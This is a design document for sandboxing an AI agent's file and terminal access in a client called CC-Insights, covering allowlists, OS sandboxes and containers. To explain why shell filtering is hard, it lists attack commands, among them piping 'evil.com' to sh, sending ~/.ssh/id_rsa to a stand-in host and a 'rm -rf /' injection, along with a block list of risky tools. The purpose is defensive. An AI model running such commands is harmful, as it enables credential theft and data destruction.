# ACP Sandboxing Architecture

This document describes how CC-Insights will implement sandboxing for ACP agent operations, including file system access and terminal command execution.

---

## Overview

### The Challenge

With ACP, the **Client** (CC-Insights) is responsible for implementing file system and terminal operations. When an agent requests `fs/read_text_file`, `fs/write_text_file`, or `terminal/create`, we execute those operations locally.

This means we must implement our own permission and sandboxing layer. Unlike the Claude SDK which has built-in permission modes (`default`, `acceptEdits`, `bypassPermissions`), ACP only provides the mechanism (`session/request_permission`) - the policy is entirely up to the client.

### Sandboxing Complexity

**Path-based sandboxing** is straightforward:

```dart
bool isAllowedPath(String path) {
  return path.startsWith(projectRoot);
}
```

**Terminal/bash sandboxing** is extremely difficult due to:

```bash
# Direct file access
cat /etc/passwd

# Subshell execution
$(cat /etc/passwd)

# Environment variable injection
export X=$(cat /etc/passwd); echo $X

# Pipe to shell
curl evil.com | sh

# Path traversal
cd /tmp && cat ../../../etc/passwd

# Symlink attacks
ln -s /etc/passwd ./safe.txt && cat safe.txt

# Command injection
npm test "; rm -rf /"

# Network exfiltration
curl -d @~/.ssh/id_rsa evil.com
```

Properly parsing and filtering shell commands would require reimplementing bash's parser - shell syntax is notoriously complex with quoting, escaping, operators, pipes, redirects, and more.

---

## Implementation Phases

### Phase 1: Simple Command Allowlist (Initial)

A conservative approach that prompts for everything except known-safe commands.

#### Permission Policy

```dart
enum PermissionDecision { autoApprove, prompt, autoReject }

class PermissionPolicy {
  final String projectRoot;

  // Exact command matches (command + args)
  final Set<String> allowedCommands = {
    'flutter test',
    'flutter build',
    'flutter analyze',
    'dart analyze',
    'dart format',
    'npm test',
    'npm run build',
    'npm run lint',
    'git status',
    'git diff',
    'git log',
    'git branch',
  };

  // Command prefixes (use carefully)
  final Set<String> allowedPrefixes = {
    'git ',        // Most git commands are safe reads
    'flutter ',    // Flutter tooling
    'dart ',       // Dart tooling
  };

  // Blocked even if prefix matches
  final Set<String> blockedPatterns = {
    'git push --force',
    'git reset --hard',
    'git clean',
    'rm -rf',
    'sudo ',
    'curl ',
    'wget ',
  };

  PermissionDecision evaluateTerminal(String command) {
    // Check blocklist first
    if (blockedPatterns.any((p) => command.contains(p))) {
      return PermissionDecision.prompt;
    }

    // Check exact matches
    if (allowedCommands.contains(command)) {
      return PermissionDecision.autoApprove;
    }

    // Check prefixes
    if (allowedPrefixes.any((p) => command.startsWith(p))) {
      return PermissionDecision.autoApprove;
    }

    // Default: prompt the user
    return PermissionDecision.prompt;
  }

  PermissionDecision evaluateFileRead(String path) {
    if (path.startsWith(projectRoot)) {
      return PermissionDecision.autoApprove;
    }
    return PermissionDecision.prompt;
  }

  PermissionDecision evaluateFileWrite(String path) {
    if (path.startsWith(projectRoot)) {
      return PermissionDecision.autoApprove;
    }
    return PermissionDecision.prompt;
  }
}
```

#### Shell Tokenization

For basic command parsing, use the [dart-shlex](https://github.com/nicomt/dart-shlex) package:

```yaml
dependencies:
  shlex: ^2.0.0
```

```dart
import 'package:shlex/shlex.dart';

// Tokenize command string
final tokens = shlex.split('git commit -m "my message"');
// Result: ['git', 'commit', '-m', 'my message']

final command = tokens.first;  // 'git'
```

**Limitations of shlex:**
- Does not parse operators (`2>/dev/null`, `&&`, `||`, `;`)
- Does not handle pipes (`|`)
- Does not perform variable expansion (`$VAR`, `$(...)`)
- Will not detect injection via `git status; rm -rf /`

This is why Phase 1 is conservative - when in doubt, prompt.

#### User-Configurable Allowlists

Allow users to extend the allowlist via settings:

```dart
class UserPermissionSettings {
  Set<String> additionalAllowedCommands = {};
  Set<String> additionalAllowedPrefixes = {};
  Set<String> additionalBlockedPatterns = {};

  // Per-session "allow always" choices
  Set<String> sessionAllowedCommands = {};
}
```

When users click "Allow always" on a permission prompt, add to `sessionAllowedCommands`. Optionally persist frequently-allowed commands to the permanent allowlist.

---

### Phase 2: OS-Level Sandboxing (Medium Term)

Use operating system primitives for real security isolation.

#### Reference Implementation

Anthropic has open-sourced their sandboxing solution:

- **Repository**: [anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- **npm Package**: [@anthropic-ai/sandbox-runtime](https://www.npmjs.com/package/@anthropic-ai/sandbox-runtime)
- **Documentation**: [Claude Code Sandboxing](https://code.claude.com/docs/en/sandboxing)
- **Blog Post**: [Making Claude Code More Secure](https://www.anthropic.com/engineering/claude-code-sandboxing)

Key stats from Anthropic's implementation:
- Reduces permission prompts by **84%**
- Prevents prompt injection from exfiltrating sensitive data

#### Platform-Specific Technologies

| Platform | Technology | Description |
|----------|------------|-------------|
| **macOS** | Seatbelt (`sandbox-exec`) | Dynamically generated S-expression profiles defining file-read, file-write, and network rules. Deny-by-default. |
| **Linux** | Landlock + seccomp + bubblewrap | Landlock for filesystem restrictions, seccomp BPF for syscall filtering, bubblewrap for namespace isolation. |
| **WSL2** | Same as Linux | Uses bubblewrap. WSL1 not supported (missing kernel features). |
| **Windows** | N/A | No native sandboxing - must use WSL2 or containers. |

#### macOS: Seatbelt Implementation

Seatbelt uses `sandbox-exec` with profiles in S-expression format:

```scheme
(version 1)
(deny default)

; Allow read access to project directory
(allow file-read*
  (subpath "/Users/zaf/projects/my-project"))

; Allow write access to project directory
(allow file-write*
  (subpath "/Users/zaf/projects/my-project"))

; Allow read access to system libraries
(allow file-read*
  (subpath "/usr/lib")
  (subpath "/System/Library"))

; Allow network to specific hosts only
(allow network-outbound
  (remote tcp "api.anthropic.com:443"))

; Deny everything else by default
```

Execute with:

```bash
/usr/bin/sandbox-exec -f profile.sb /bin/bash -c "npm test"
```

**Note**: `sandbox-exec` may not be available on newer macOS versions. Check for existence before use.

#### Linux: Landlock + seccomp + bubblewrap

**Landlock** (kernel 5.13+) provides filesystem sandboxing:

```c
// Simplified - actual implementation is more complex
struct landlock_ruleset_attr ruleset_attr = {
  .handled_access_fs = LANDLOCK_ACCESS_FS_READ_FILE |
                       LANDLOCK_ACCESS_FS_WRITE_FILE,
};
```

**seccomp BPF** filters system calls. Anthropic provides pre-compiled filters for x64/ARM64 (~104 bytes each), architecture-specific but libc-independent.

**bubblewrap** provides namespace isolation:

```bash
bwrap \
  --ro-bind /usr /usr \
  --bind /home/user/project /home/user/project \
  --unshare-net \
  --die-with-parent \
  /bin/bash -c "npm test"
```

#### Network Isolation Strategy

Anthropic's approach:
1. Remove network namespace from sandboxed process
2. Run HTTP and SOCKS5 proxy servers on host
3. Route all traffic through proxies
4. Filter requests based on allowed domains

```
┌─────────────────────────────────────────┐
│  Sandboxed Process (no network)         │
│                                         │
│  ┌─────────────────────────────────┐   │
│  │  npm test                        │   │
│  │  (network calls fail)            │   │
│  └──────────────┬──────────────────┘   │
│                 │ socat                 │
│                 ▼                       │
└─────────────────┼───────────────────────┘
                  │ Unix socket
                  ▼
┌─────────────────────────────────────────┐
│  Host Proxy (HTTP/SOCKS5)               │
│                                         │
│  Allowed: api.anthropic.com             │
│  Allowed: registry.npmjs.org            │
│  Blocked: *                             │
└─────────────────────────────────────────┘
```

#### Integration Options

**Option A: Spawn sandbox-runtime from Dart**

```dart
Future<Process> runSandboxed(String command, SandboxConfig config) async {
  return Process.start('npx', [
    '@anthropic-ai/sandbox-runtime',
    '--allow-read', config.projectRoot,
    '--allow-write', config.projectRoot,
    '--allow-net', 'api.anthropic.com',
    '--',
    '/bin/bash', '-c', command,
  ]);
}
```

**Option B: Native Dart FFI integration**

Call Seatbelt/Landlock APIs directly via `dart:ffi`. More complex but avoids Node.js dependency.

**Option C: Dart implementation inspired by sandbox-runtime**

Port the logic to Dart, using `Process.start` for `sandbox-exec` on macOS and `bwrap` on Linux.

---

### Phase 3: Container Isolation (Long Term)

Full container isolation for maximum security and reproducibility.

#### Benefits

- Complete filesystem isolation
- Network isolation by default
- Reproducible environments
- Works consistently across platforms
- Can snapshot/restore state

#### Implementation Approaches

**Docker-based:**

```dart
Future<Process> runInContainer(String command, ContainerConfig config) async {
  return Process.start('docker', [
    'run',
    '--rm',
    '-v', '${config.projectRoot}:/workspace',
    '-w', '/workspace',
    '--network', config.allowNetwork ? 'bridge' : 'none',
    config.image,
    '/bin/bash', '-c', command,
  ]);
}
```

**Considerations:**
- Docker must be installed and running
- Startup latency for containers
- Volume mount performance on macOS
- Image management and updates
- Dev experience changes (tools must be in container)

#### Hybrid Approach

Use containers for high-risk operations, OS sandboxing for common commands:

```dart
PermissionDecision evaluateTerminal(String command) {
  if (isHighRisk(command)) {
    return PermissionDecision.requireContainer;
  }
  if (canSandbox(command)) {
    return PermissionDecision.osSandbox;
  }
  return PermissionDecision.prompt;
}
```

---

## Architecture Summary

```
┌─────────────────────────────────────────────────────────┐
│                    ACP Agent                            │
│                                                         │
│  terminal/create { command: "npm test" }                │
└───────────────────────┬─────────────────────────────────┘
                        │ JSON-RPC
                        ▼
┌─────────────────────────────────────────────────────────┐
│                CC-Insights Client                       │
│                                                         │
│  ┌─────────────────────────────────────────────────┐   │
│  │            PermissionPolicy                      │   │
│  │                                                  │   │
│  │  1. Check blocklist                             │   │
│  │  2. Check allowlist                             │   │
│  │  3. Check user settings                         │   │
│  │  4. Determine: autoApprove / prompt / sandbox   │   │
│  └──────────────────────┬──────────────────────────┘   │
│                         │                               │
│           ┌─────────────┼─────────────┐                │
│           ▼             ▼             ▼                │
│     ┌──────────┐  ┌──────────┐  ┌──────────┐          │
│     │ Direct   │  │ Sandbox  │  │Container │          │
│     │ Execute  │  │ Execute  │  │ Execute  │          │
│     │          │  │          │  │          │          │
│     │ Phase 1  │  │ Phase 2  │  │ Phase 3  │          │
│     └──────────┘  └──────────┘  └──────────┘          │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

## Security Considerations

### What Sandboxing Protects Against

- **Prompt injection**: Malicious instructions in files/context can't exfiltrate data
- **Accidental damage**: Typos or misunderstandings can't destroy files outside project
- **Supply chain attacks**: Compromised dependencies can't access sensitive files
- **Network exfiltration**: Can't phone home to attacker servers

### What Sandboxing Does NOT Protect Against

- **Attacks within the project**: Malicious code can still modify project files
- **Authorized network access**: If you allow `npmjs.org`, a package can still exfiltrate via dependencies
- **User override**: Users can always click "Allow" on any prompt
- **Container escapes**: Rare but possible, especially with privileged containers

### Defense in Depth

Combine multiple layers:

1. **Permission prompts**: User awareness and approval
2. **Allowlists**: Reduce prompt fatigue for known-safe operations
3. **OS sandboxing**: Enforce restrictions even if agent is compromised
4. **Containers**: Full isolation for untrusted operations
5. **Audit logging**: Track all operations for review

---

## References

- [Claude Code Sandboxing Docs](https://code.claude.com/docs/en/sandboxing)
- [sandbox-runtime on GitHub](https://github.com/anthropic-experimental/sandbox-runtime)
- [sandbox-runtime on npm](https://www.npmjs.com/package/@anthropic-ai/sandbox-runtime)
- [Anthropic Engineering Blog: Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
- [Deep Dive on Agent Sandboxes](https://pierce.dev/notes/a-deep-dive-on-agent-sandboxes)
- [dart-shlex on GitHub](https://github.com/nicomt/dart-shlex)
- [shlex on pub.dev](https://pub.dev/documentation/shlex/latest/)
- [Apple Sandbox Guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/)
- [Landlock Documentation](https://docs.kernel.org/userspace-api/landlock.html)
- [bubblewrap on GitHub](https://github.com/containers/bubblewrap)
